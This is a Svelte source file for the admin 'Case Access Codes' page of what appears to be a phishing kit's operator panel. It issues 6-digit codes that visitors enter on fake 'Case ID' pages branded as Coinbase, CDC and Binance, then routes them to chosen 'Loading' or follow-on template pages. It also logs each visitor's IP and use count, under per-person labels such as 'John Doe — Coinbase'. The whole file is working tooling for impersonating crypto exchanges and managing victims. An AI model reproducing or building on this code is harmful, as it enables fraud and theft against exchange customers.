<script lang="ts">
	import { onMount } from 'svelte';
	import {
		KeyRound,
		Plus,
		RefreshCw,
		Trash2,
		Copy,
		Check,
		X,
		Sparkles,
		Search,
		Power,
		PowerOff,
		Filter,
		ToggleLeft,
		ToggleRight,
		ArrowUpRight
	} from 'lucide-svelte';
	import { toast } from '$lib/stores/toast';
	import { MODULES } from '$lib/modules';
	import { templates } from '$lib/templates';
	import ConnectionBadge from '$lib/components/ConnectionBadge.svelte';

	interface CaseCode {
		id: string;
		code: string;
		label: string;
		module: string;
		targetPage: string;
		active: boolean;
		uses: number;
		lastUsedAt: number;
		lastUsedIp: string;
		ownerUsername: string;
		createdAt: number;
		expiresAt: number;
	}

	let codes: CaseCode[] = $state([]);
	let loading = $state(false);
	let search = $state('');
	let moduleFilter = $state('');
	let statusFilter = $state<'' | 'active' | 'inactive'>('');
	let autoRefresh = $state(true);
	let pollTimer: ReturnType<typeof setInterval> | null = null;
	let copiedId = $state<string | null>(null);

	let showAdd = $state(false);
	let newCode = $state('');
	let newLabel = $state('');
	let newModule = $state('');
	let newTarget = $state('');
	let newExpiresAt = $state('');
	let creating = $state(false);
	let createError = $state('');

	function generateCode(): string {
		const buf = new Uint32Array(1);
		try {
			crypto.getRandomValues(buf);
		} catch {
			buf[0] = Math.floor(Math.random() * 1_000_000);
		}
		return String(buf[0] % 1_000_000).padStart(6, '0');
	}

	function landingFor(moduleId: string): string {
		const mod = MODULES.find((m) => m.id === moduleId);
		if (!mod) return '';
		const loading = mod.landingPages.find((p) => p.label.toLowerCase().includes('loading'));
		return loading ? `/templates/preview/${moduleId}/Loading` : '';
	}

	function pagesFor(moduleId: string): string[] {
		const brand = templates[moduleId];
		if (!brand) return [];
		return Object.keys(brand.routes).map((p) => `/templates/preview/${moduleId}/${p}`);
	}

	let targetSuggestions = $derived(newModule ? pagesFor(newModule) : []);

	async function fetchCodes() {
		loading = true;
		try {
			const params = new URLSearchParams();
			if (search.trim()) params.set('search', search.trim());
			if (moduleFilter) params.set('module', moduleFilter);
			if (statusFilter === 'active') params.set('active', '1');
			else if (statusFilter === 'inactive') params.set('active', '0');
			const res = await fetch(`/api/cases?${params}`);
			if (res.ok) {
				const data = await res.json();
				codes = data.codes;
			} else if (res.status === 401) {
				window.location.href = '/login';
			}
		} finally {
			loading = false;
		}
	}

	let searchTimer: ReturnType<typeof setTimeout> | null = null;
	function onSearchInput() {
		if (searchTimer) clearTimeout(searchTimer);
		searchTimer = setTimeout(fetchCodes, 250);
	}

	$effect(() => {
		[moduleFilter, statusFilter];
		fetchCodes();
	});

	onMount(() => {
		fetchCodes();
		pollTimer = setInterval(() => {
			if (autoRefresh) fetchCodes();
		}, 10000);
		return () => {
			if (pollTimer) clearInterval(pollTimer);
		};
	});

	function openCreate() {
		newCode = generateCode();
		newLabel = '';
		newModule = '';
		newTarget = '';
		newExpiresAt = '';
		createError = '';
		showAdd = true;
	}

	async function submitCreate() {
		createError = '';
		const code = newCode.replace(/\D/g, '');
		if (code.length !== 6) {
			createError = 'Code must be exactly 6 digits.';
			return;
		}
		creating = true;
		try {
			const payload: Record<string, unknown> = {
				code,
				label: newLabel.trim(),
				module: newModule,
				targetPage: newTarget.trim()
			};
			if (newExpiresAt) {
				const ts = Date.parse(newExpiresAt);
				if (!Number.isNaN(ts)) payload.expiresAt = ts;
			}
			const res = await fetch('/api/cases', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(payload)
			});
			if (res.ok) {
				toast.success('Case access code created');
				showAdd = false;
				await fetchCodes();
			} else {
				const data = await res.json().catch(() => ({}));
				createError = data.message || `Failed (${res.status})`;
			}
		} catch (err: any) {
			createError = err?.message || 'Network error';
		} finally {
			creating = false;
		}
	}

	async function toggleActive(c: CaseCode) {
		const res = await fetch(`/api/cases/${c.id}`, {
			method: 'PATCH',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ active: !c.active })
		});
		if (res.ok) {
			await fetchCodes();
			toast.success(c.active ? 'Code disabled' : 'Code enabled');
		} else {
			toast.error('Failed to update code');
		}
	}

	async function removeCode(c: CaseCode) {
		if (!confirm(`Delete case access code ${c.code}? This cannot be undone.`)) return;
		const res = await fetch(`/api/cases/${c.id}`, { method: 'DELETE' });
		if (res.ok) {
			await fetchCodes();
			toast.success('Code deleted');
		} else {
			toast.error('Failed to delete code');
		}
	}

	function copyCode(c: CaseCode) {
		navigator.clipboard?.writeText(c.code);
		copiedId = c.id;
		toast.success('Code copied');
		setTimeout(() => (copiedId = null), 1200);
	}

	function fmtDate(ts: number): string {
		if (!ts) return '—';
		try {
			return new Date(ts).toLocaleString();
		} catch {
			return '—';
		}
	}

	function isExpired(ts: number): boolean {
		return ts > 0 && ts < Date.now();
	}

	function moduleColor(m: string): string {
		const lc = (m || '').toLowerCase();
		if (lc.includes('vault')) return 'bg-purple-500/15 text-purple-300';
		if (lc.includes('coinbase')) return 'bg-blue-500/15 text-blue-300';
		if (lc.includes('cdc') || lc.includes('crypto')) return 'bg-sky-500/15 text-sky-300';
		if (lc.includes('binance')) return 'bg-amber-500/15 text-amber-300';
		if (lc.includes('gemini')) return 'bg-cyan-500/15 text-cyan-300';
		if (lc.includes('kraken')) return 'bg-violet-500/15 text-violet-300';
		return 'bg-[var(--accent)]/30 text-[var(--muted-foreground)]';
	}

	const CASE_BRANDS = ['Coinbase', 'CDC', 'Binance'] as const;
</script>

<svelte:head>
	<title>Cases · Panel</title>
</svelte:head>

<div class="p-8 pt-5">
	<div class="mb-5 flex flex-wrap items-center justify-between gap-3">
		<div>
			<h1 class="text-2xl font-bold text-[var(--foreground)]">Case Access Codes</h1>
			<p class="mt-1 text-sm text-[var(--muted-foreground)]">
				Create the 6-digit codes visitors enter on Case ID pages
				({CASE_BRANDS.join(', ')}). Active codes route the visitor to the configured next page.
			</p>
		</div>
		<div class="flex items-center gap-2">
			<ConnectionBadge />
			<button
				onclick={() => (autoRefresh = !autoRefresh)}
				aria-pressed={autoRefresh}
				aria-label="Toggle auto-refresh"
				class="flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-xs transition-soft {autoRefresh ? 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]' : 'border-[var(--border)] text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
			>
				{#if autoRefresh}<ToggleRight size={12} />{:else}<ToggleLeft size={12} />{/if}
				Auto-refresh: {autoRefresh ? 'On' : 'Off'}
			</button>
			<button onclick={fetchCodes} aria-label="Refresh codes" class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
				<RefreshCw size={12} class={loading ? 'animate-spin' : ''} />
				Refresh
			</button>
			<button onclick={openCreate} class="btn-accent flex items-center gap-1.5 px-4 py-2 text-xs">
				<Plus size={13} />
				New code
			</button>
		</div>
	</div>

	<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
		<div class="border-b border-[var(--border)] px-5 py-3 flex items-center justify-between gap-3 flex-wrap">
			<div class="flex items-center gap-2">
				<KeyRound size={14} class="text-[var(--text-accent)]" />
				<p class="text-sm font-semibold text-[var(--foreground)]">Access codes</p>
				<span class="rounded-md bg-[var(--accent-primary)]/10 px-2 py-0.5 text-[10px] font-bold text-[var(--text-accent)]">{codes.length}</span>
			</div>
			<div class="flex items-center gap-2 flex-wrap">
				<div class="relative">
					<Search size={11} class="absolute left-2.5 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)]" />
					<input
						type="text"
						bind:value={search}
						oninput={onSearchInput}
						placeholder="Search by code, label, or module..."
						class="w-72 rounded-md border border-[var(--border)] bg-[var(--input)] py-1.5 pl-7 pr-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"
					/>
				</div>
				<select bind:value={moduleFilter} class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1.5 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
					<option value="">All Modules</option>
					{#each CASE_BRANDS as b}
						<option value={b}>{b}</option>
					{/each}
				</select>
				<select bind:value={statusFilter} class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1.5 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
					<option value="">All Status</option>
					<option value="active">Active</option>
					<option value="inactive">Inactive</option>
				</select>
			</div>
		</div>

		<div class="grid grid-cols-[140px_minmax(0,1.4fr)_120px_90px_minmax(0,1.4fr)_minmax(0,1fr)_minmax(0,1fr)_72px] gap-4 border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-5 py-2">
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Code</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Label</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Module</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Status</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Target after submit</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Usage</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Created</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)] text-right">Actions</span>
		</div>

		{#if codes.length === 0}
			<div class="flex flex-col items-center justify-center py-16 text-center">
				<KeyRound size={36} class="mb-2 text-[var(--text-tertiary)]" />
				<p class="text-sm font-semibold text-[var(--foreground)]">No case codes yet</p>
				<p class="mt-1 text-xs text-[var(--muted-foreground)]">Click "New code" to create one. Visitors will use it on the Case ID page.</p>
				<button onclick={openCreate} class="mt-4 btn-accent flex items-center gap-1.5 px-4 py-2 text-xs">
					<Plus size={13} />
					Create first code
				</button>
			</div>
		{:else}
			<div class="max-h-[64vh] overflow-y-auto custom-scrollbar">
				{#each codes as c (c.id)}
					{@const expired = isExpired(c.expiresAt)}
					<div class="grid grid-cols-[140px_minmax(0,1.4fr)_120px_90px_minmax(0,1.4fr)_minmax(0,1fr)_minmax(0,1fr)_72px] items-center gap-4 border-b border-[var(--border-subtle)] px-5 py-3 hover:bg-[var(--accent)]/30">
						<div class="flex items-center gap-2 min-w-0">
							<p class="font-mono text-sm font-semibold tracking-[0.18em] text-[var(--foreground)]">{c.code}</p>
							<button
								onclick={() => copyCode(c)}
								class="shrink-0 rounded-md p-1 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
								aria-label="Copy code"
								title="Copy code"
							>
								{#if copiedId === c.id}
									<Check size={11} class="text-[var(--status-live)]" />
								{:else}
									<Copy size={11} />
								{/if}
							</button>
						</div>
						<div class="min-w-0">
							<p class="truncate text-xs text-[var(--foreground)]">{c.label || '—'}</p>
							{#if c.ownerUsername}
								<p class="mt-0.5 truncate text-[10px] text-[var(--text-tertiary)]">By: {c.ownerUsername}</p>
							{/if}
						</div>
						<span class="inline-flex w-fit items-center rounded-md px-2 py-0.5 text-[11px] font-medium {moduleColor(c.module)}">
							{c.module || '—'}
						</span>
						<div>
							{#if expired}
								<span class="inline-flex w-fit items-center rounded-md border border-amber-500/30 bg-amber-500/10 px-2 py-0.5 text-[11px] font-medium text-amber-300">Expired</span>
							{:else if c.active}
								<span class="inline-flex w-fit items-center rounded-md border border-[var(--status-live)]/30 bg-[var(--status-live)]/10 px-2 py-0.5 text-[11px] font-medium text-[var(--status-live)]">Active</span>
							{:else}
								<span class="inline-flex w-fit items-center rounded-md border border-[var(--border)] bg-[var(--accent)]/30 px-2 py-0.5 text-[11px] font-medium text-[var(--muted-foreground)]">Disabled</span>
							{/if}
						</div>
						<div class="min-w-0">
							{#if c.targetPage}
								<a href={c.targetPage} target="_blank" rel="noopener" class="inline-flex items-center gap-1 truncate font-mono text-[11px] text-[var(--text-accent)] hover:underline">
									<span class="truncate">{c.targetPage}</span>
									<ArrowUpRight size={10} class="shrink-0" />
								</a>
							{:else if c.module}
								<p class="truncate font-mono text-[11px] text-[var(--muted-foreground)]" title="Default for module">
									{landingFor(c.module) || `${c.module} default`}
								</p>
							{:else}
								<p class="truncate text-[11px] text-[var(--text-tertiary)]">—</p>
							{/if}
						</div>
						<div class="min-w-0">
							<p class="text-xs text-[var(--foreground)]">{c.uses} {c.uses === 1 ? 'use' : 'uses'}</p>
							{#if c.lastUsedAt}
								<p class="mt-0.5 truncate text-[10px] text-[var(--text-tertiary)]">Last: {fmtDate(c.lastUsedAt)}</p>
							{/if}
							{#if c.lastUsedIp}
								<p class="mt-0.5 truncate font-mono text-[10px] text-[var(--text-tertiary)]">{c.lastUsedIp}</p>
							{/if}
						</div>
						<div>
							<p class="text-[11px] text-[var(--muted-foreground)]">{fmtDate(c.createdAt)}</p>
							{#if c.expiresAt > 0}
								<p class="mt-0.5 text-[10px] text-[var(--text-tertiary)]">Expires: {fmtDate(c.expiresAt)}</p>
							{/if}
						</div>
						<div class="flex items-center justify-end gap-1">
							<button
								onclick={() => toggleActive(c)}
								class="rounded-md p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
								title={c.active ? 'Disable code' : 'Enable code'}
								aria-label={c.active ? 'Disable code' : 'Enable code'}
							>
								{#if c.active}<Power size={12} />{:else}<PowerOff size={12} />{/if}
							</button>
							<button
								onclick={() => removeCode(c)}
								class="rounded-md p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]"
								title="Delete code"
								aria-label="Delete code"
							>
								<Trash2 size={12} />
							</button>
						</div>
					</div>
				{/each}
			</div>
		{/if}
	</div>

	<div class="mt-4 rounded-xl border border-[var(--border)] bg-[var(--card)] p-5">
		<div class="flex items-start gap-3">
			<div class="mt-0.5 flex h-7 w-7 shrink-0 items-center justify-center rounded-md bg-[var(--accent-primary)]/15 text-[var(--text-accent)]">
				<KeyRound size={14} />
			</div>
			<div>
				<p class="text-sm font-semibold text-[var(--foreground)]">How visitors use these codes</p>
				<p class="mt-1 text-xs text-[var(--muted-foreground)]">
					Visitors landing on a Case ID page enter the 6-digit code into the boxes. As soon as all six digits are typed (or pasted), the page validates against your active codes.
					<span class="text-[var(--foreground)]">Valid</span> codes route the visitor to the configured target page (or the module's Loading page by default).
					<span class="text-[var(--foreground)]">Invalid</span> codes shake the inputs and clear them.
				</p>
				<p class="mt-2 text-xs text-[var(--muted-foreground)]">
					Case ID pages live at
					<code class="rounded bg-[var(--accent)]/30 px-1 font-mono text-[11px]">/templates/preview/Coinbase/Case ID</code>,
					<code class="rounded bg-[var(--accent)]/30 px-1 font-mono text-[11px]">/templates/preview/CDC/Case ID</code> and
					<code class="rounded bg-[var(--accent)]/30 px-1 font-mono text-[11px]">/templates/preview/Binance/Case</code>.
				</p>
			</div>
		</div>
	</div>
</div>

{#if showAdd}
	<div
		class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4"
		onclick={() => (showAdd = false)}
		onkeydown={(e) => { if (e.key === 'Escape') showAdd = false; }}
		role="presentation"
	>
		<div
			class="w-full max-w-lg rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl"
			onclick={(e) => e.stopPropagation()}
			onkeydown={(e) => e.stopPropagation()}
			role="dialog"
			aria-modal="true"
			aria-labelledby="case-create-title"
			tabindex="-1"
		>
			<div class="mb-4 flex items-center justify-between">
				<h3 id="case-create-title" class="text-base font-semibold text-[var(--foreground)]">New Case Access Code</h3>
				<button onclick={() => (showAdd = false)} class="rounded-lg p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--accent)]" aria-label="Close"><X size={16} /></button>
			</div>

			<div class="space-y-4">
				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]" for="case-code-input">Access Code (6 digits) <span class="text-red-400">*</span></label>
					<div class="flex items-center gap-2">
						<input
							id="case-code-input"
							bind:value={newCode}
							type="text"
							inputmode="numeric"
							maxlength="6"
							placeholder="123456"
							class="flex-1 rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-base tracking-[0.3em] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
						/>
						<button onclick={() => (newCode = generateCode())} class="rounded-md border border-[var(--border)] px-3 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]" title="Generate random 6-digit code">
							<Sparkles size={12} />
						</button>
					</div>
					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">Visitors enter this exact code on the Case ID page. Tap the spark to generate a fresh one.</p>
				</div>

				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]" for="case-label-input">Label (optional)</label>
					<input
						id="case-label-input"
						bind:value={newLabel}
						type="text"
						placeholder="e.g., John Doe — Coinbase"
						class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
					/>
				</div>

				<div class="grid gap-3 sm:grid-cols-2">
					<div>
						<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]" for="case-module-input">Module</label>
						<select id="case-module-input" bind:value={newModule} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
							<option value="">Any</option>
							{#each CASE_BRANDS as b}
								<option value={b}>{b}</option>
							{/each}
						</select>
					</div>
					<div>
						<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]" for="case-expires-input">Expires at (optional)</label>
						<input
							id="case-expires-input"
							bind:value={newExpiresAt}
							type="datetime-local"
							class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
						/>
					</div>
				</div>

				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]" for="case-target-input">Redirect after submit (optional)</label>
					<input
						id="case-target-input"
						bind:value={newTarget}
						type="text"
						placeholder={newModule ? landingFor(newModule) || '/templates/preview/...' : '/templates/preview/...'}
						list="case-target-suggestions"
						class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
					/>
					<datalist id="case-target-suggestions">
						{#each targetSuggestions as t}
							<option value={t}></option>
						{/each}
					</datalist>
					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">
						Leave blank to use the module's default Loading page.
					</p>
				</div>

				{#if createError}
					<div class="rounded-md border border-[var(--destructive)]/30 bg-[var(--destructive)]/10 px-3 py-2 text-xs text-[var(--destructive)]">
						{createError}
					</div>
				{/if}
			</div>

			<div class="mt-5 flex justify-end gap-2">
				<button onclick={() => (showAdd = false)} class="rounded-md border border-[var(--border)] px-4 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={submitCreate} disabled={creating || newCode.replace(/\D/g, '').length !== 6} class="btn-accent px-4 py-2 text-xs disabled:opacity-50 disabled:cursor-not-allowed">
					{creating ? 'Creating…' : 'Create code'}
				</button>
			</div>
		</div>
	</div>
{/if}
